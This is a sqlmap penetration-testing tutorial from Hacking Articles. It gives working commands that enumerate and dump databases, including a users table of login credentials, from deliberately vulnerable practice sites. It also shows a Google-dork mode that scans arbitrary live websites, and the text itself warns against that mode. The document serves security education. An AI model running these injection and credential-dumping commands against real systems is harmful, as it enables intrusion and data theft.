 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Original Author(s): Harshit Rajpal & Aarti Singh 
 
 
 
 
 
 
Sqlmap 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 2  
 
 
 
Table of Contents 
 
Abstract ................................................................................................................................................... 3 
Introduction ............................................................................................................................................ 4 
Database Penetration Testing ................................................................................................................ 5 
Databases .................................................................................................................................... 8 
Tables ......................................................................................................................................... 10 
Columns ..................................................................................................................................... 11 
Get data from a table ........................................................................................................... 12 
Dump All .................................................................................................................................... 13 
Target options ....................................................................................................................................... 14 
Target URL ................................................................................................................................ 15 
Targeting Log File .................................................................................................................. 17 
Target Bulkfile ......................................................................................................................... 20 
Target Google Dorks .............................................................................................................. 22 
Target HTTP requests ........................................................................................................... 23 
Conclusion ............................................................................................................................................ 25 
References ........................................................................................................................................... 25 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 3  
 
Abstract 
 
Sqlmap is an open-source penetration testing tool that automates the process of 
detecting and exploiting SQL injection flaws and taking over of database servers. 
It comes with a powerful detection engine, many niche features for the ultimate 
penetration tester and a broad range of switches lasting from database 
fingerprinting, over data fetching from the database, to accessing the underlying 
file system and executing commands on the operating system via out-of-band 
connections. 
In this report, we’ll be shifting our focus on one of the finest tools for SQL 
penetration testing. Many might not have tried sqlmap commands but they can be 
proved very useful in the corporate world. 
Disclaimer: This report is provided for educational and informational 
purpose only (Penetration Testing). Penetration Testing refers to legal 
intrusion tests that aim to identify vulnerabilities and improve cybersecurity, 
rather than for malicious purposes. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 4  
 
Introduction 
 
Sqlmap comes inbuilt in Kali Linux however you can download its python script from the 
Github repository too. 
Features 
• 
Full support for MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft 
Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, HSQLDB and Informix 
database management systems. 
• 
Full support for six SQL injection techniques: boolean-based blind, time-based blind, 
error-based, UNION query-based, stacked queries and out-of-band. 
• 
Support to directly connect to the database without passing via a SQL injection, by 
providing DBMS credentials, IP address, port, and database name. 
• 
Support to enumerate users, password hashes, privileges, roles, databases, tables, and 
columns. 
• 
Automatic recognition of password hash formats and support for cracking them using 
a dictionary-based attack. 
• 
Support to dump database tables entirely, a range of entries or specific columns as per 
user’s choice. The user can also choose to dump only a range of characters from each 
column’s entry. 
• 
Support to search for specific database names, specific tables across all databases or 
specific columns across all databases’ tables. This is useful, for instance, to identify 
tables containing custom application credentials where relevant columns’ names 
contain a string like a name and pass. 
• 
Support to download and upload any file from the database server underlying file 
system when the database software is MySQL, PostgreSQL or Microsoft SQL Server. 
• 
Support to execute arbitrary commands and retrieve their standard output on the 
database server underlying operating system when the database software is MySQL, 
PostgreSQL or Microsoft SQL Server. 
• 
Support to establish an out-of-band stateful TCP connection between the attacker 
machine and the database server underlying operating system. This channel can be an 
interactive command prompt, a Meterpreter session or a graphical user interface 
(VNC) session as per user’s choice. 
• 
Support for database process’ user privilege escalation via Metasploit’sMeterpreter 
getsystem command. 
 
Since it is a crime to attack a live website, we are restricting our focus on the websites that 
are made for this testing purpose only. We have also used a local PC with SQL dhakkan 
installed in it. So, without further ado, let’s dive in. 
 
 
 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 5  
 
Database Penetration Testing 
 
These options can be used to enumerate the back-end database management system 
information, structure, and data contained in the tables. 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 6  
 
 
Sometimes you visit such websites that let you select product item through their picture 
gallery if you observer its URL you will notice that product item is called through its product-
ID numbers. 
Let’s take an example 
 
So, when attacker visits such kind of website, he always checks for SQL vulnerability inside 
web server for lunching SQL attack. 
http://testphp.vulnweb.com/artists.php?artist=1 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 7  
 
 
Let’s check how attacker verifies SQL vulnerability. 
The attacker will try to break the query in order to order to get the error message, if he 
successfully received an error message then it confirms that web server is SQL injection 
affected. 
 
From the screenshot you can see we have received error message successfully now we have 
made SQL attack on a web server so that we can fetch database information. 
http://testphp.vulnweb.com/artists.php?artist=1' 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 8  
 
 
 
Databases 
 
For database penetration testing we always choose SQLMAP, this tool is very helpful for 
beginners who are unable to retrieve database information manually or unaware of SQL 
injection techniques. 
Open the terminal in your Kali Linux and type following command which start SQL injection 
attack on the targeted website.   
 
 -u:  target URL 
–dbs: fetch database name 
–batch: This will leave sqlmap to go with default behavior whenever user’s input would be 
required 
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 9  
 
 
Here from the given screenshot, you can see we have successfully retrieved database name 
“acuart” 
 
 
 
 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 10  
 
Tables 
 
As we know a database is a set of record which consist of multiple tables inside it therefore 
now uses another command in order to fetch entire table names from inside the database 
system. 
 
 -D: DBMS database to enumerate (fetched database name) 
–tables: enumerate DBMS database table 
 
As a result, given in screenshot, we have enumerated entire table name of the database 
system. There are 8 tables inside the database “acuart” as following: 
T1: artists 
T2: carts 
T3: categ 
T4: featured  
T5: guestbook 
T6: pictures 
T7: products  
T8: users 
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --table --batch 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 11  
 
 
 
Columns 
 
Now further we will try to enumerate the column name of the desired table. Since we know 
there is a user’s table inside the database acuart and we want to know all column names of 
users table, therefore, we will generate another command for column captions enumeration. 
 
-T: DBMS table to enumerate (fetched table name) 
–columns: enumerate DBMS database columns 
 
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 12  
 
 
 
Get data from a table 
 
Slowly and gradually, we have penetrated many details of the database but last and most 
important step is to retrieve information from inside the columns of a table. Hence, at last, we 
will generate a command which will dump information of users table. 
 
–dump: dump all information of DBMS database 
 
Here from the given screenshot, you can see it has to dump entire information of table users, 
mainly users table contains login credential of other users. You can use these credentials for 
login into the server on behalf of other users. 
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 13  
 
 
 
Dump All 
 
The last command is the most powerful command in sqlmap which will save your time in 
database penetration testing; this command will perform all the above functions at once and 
dump entire database information including table names, column and etc. 
 
 
This will give you all information at once which contains database name as well as table’s 
records. 
Try it yourself!!! 
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --dump-all --batch 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 14  
 
 
 
Target options 
 
 
First and foremost, I configured SQL dhakkan in a machine with IP address 192.168.1.132. I 
go to the lesson 1 tab for error based SQLi. 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 15  
 
 
 
 
Target URL 
 
One of the most basic commands ever. Every database has a webpage and every webpage has 
a URL. We will attack these URLs to get our hands on the database inside! 
By adding   ‘-u <URL>’ in sqlmap command we can specify the URL we are targeting to 
check for SQL injection. It is the most basic and necessary operation. 
Here, let’s fetch all the databases that IP address 192.168.1.132 might have by suffixing –dbs 
http://192.168.1.132/sqli 
sqlmap -u http://192.168.1.132/sqli/Less-1/?id=1 --dbs 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 16  
 
 
Now, all the databases available in the given IP have been dumped! 
 
 
 
 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 17  
 
 
Targeting Log File 
 
Many tools save a log file to keep a record on the IP addresses communicating back and 
forth. We can feed one such log file to the sqlmap and it will automatically test all the URLs 
in that log file. 
The log file can have a record of various targets in reality but here we’ll be capturing the 
request of a website in burp suite and then saving its log file for simplicity. Let’s turn on the 
intercept then. 
 
Go to the website “leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1” and capture the 
request in a burp. It has an SQL injection lab installed over public IP for penetration testers. 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 18  
 
 
The captured request will be something like: 
 
 
Now right click->save item and save this request as “logfile” on the desktop. No need to 
provide any extensions here. 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 19  
 
 
Open the terminal and type in the following command to automate the attack from the log file 
itself. 
 
 
 
 
sqlmap -l /root/Desktop/logfile 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 20  
 
 
 
Target Bulkfile 
 
Bulkfile is a text file that has the URLs of all the target machines each in a single line with 
the exact URL of where the attack is applicable. 
So, let’s create a bulkfile on the desktop called bulkfile.txt. 
.txt 
 
This will open up a command line text editor called ‘nano’. Let’s feed in some URLs. 
To save the file: CTRL+O -> ENTER 
To exit nano: CTRL+X 
We are all set to attack both of these URLs together by the command: 
 
 
sqlmap -m /root/Desktop/bulkfile.txt --dbs 
touch bulkfile.txt 
sudo nano bulkfile.txt 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 21  
 
 
We’ll get the list of databases and we can continue with our other URL. 
 
 
 
 
 
 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 22  
 
 
Target Google Dorks 
 
We can also automate the process of finding SQLi by adding in a Google dork target. What it 
does is that it will start searching for all the websites with given Google dork and 
automatically keep applying sqlmap on the websites that match the dork. Disclaimer: this 
attack will automatically be applied to any website that matches the dork, be it government or 
military, which is a serious criminal offense so it is advised that you play with it carefully. 
As we know that error based SQL injections are often found in URLs having 
‘.php?id=<num>’ in them, we can apply the inurl Google dork to find all the websites with 
this in its URL.  
 
 
As you can see sqlmap has found a website with ‘?id=1’ in its URL. 
I’ll be pressing n and canceling the sqlmap scan since it is a crime to do so. 
We can also specify the specific page number on which we want to apply the Google dork at 
by the option “–gpage” 
sqlmap –g "inurl: ?id=1" 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 23  
 
 
 
Target HTTP requests 
 
An HTTP client sends an HTTP request to a server in the form of a request message which 
includes the following format: 
 
A Request-line 
 
Zero or more header (General|Request|Entity) fields followed by CRLF 
 
An empty line (i.e., a line with nothing preceding the CRLF) indicating the end of the header 
fields 
 
Optionally a message-body 
The Request-Line begins with a method token, followed by the Request-URI and the protocol 
version, and ending with CRLF. The elements are separated by space SP 
characters.                         
Request-Line = Method SP Request-URI SP HTTP-Version CRLF 
Hence, we can intercept these HTTP requests, save it in a text file and automate the attack 
with sqlmap. 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 24  
 
 
I captured the request of the website “master.byethost18.com/Less-1/?id=1” in the burp and 
will save it in a text file called “httprequest.txt” and run the command: 
 
As you can see that sqlmap has detected the target in the text file. We can further apply –dbs 
to fetch all the databases. 
sqlmap -r /root/Desktop/httprequest.txt 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 25  
 
 
 
Conclusion 
We hope that this report was helpful and the readers have learned some new options that they 
might not have heard about before. Keep hacking! 
Hence, one can make use of these commands as a cybersecurity professional to 
assess vulnerabilities on systems and keep these systems away from threat. 
 
References 
• 
https://www.hackingarticles.in/comprehensive-guide-to-sqlmap-target-options/ 
• 
https://www.hackingarticles.in/database-penetration-testing-using-sqlmap-part-1/ 
• 
https://github.com/sqlmapproject/sqlmap 
 
 
 
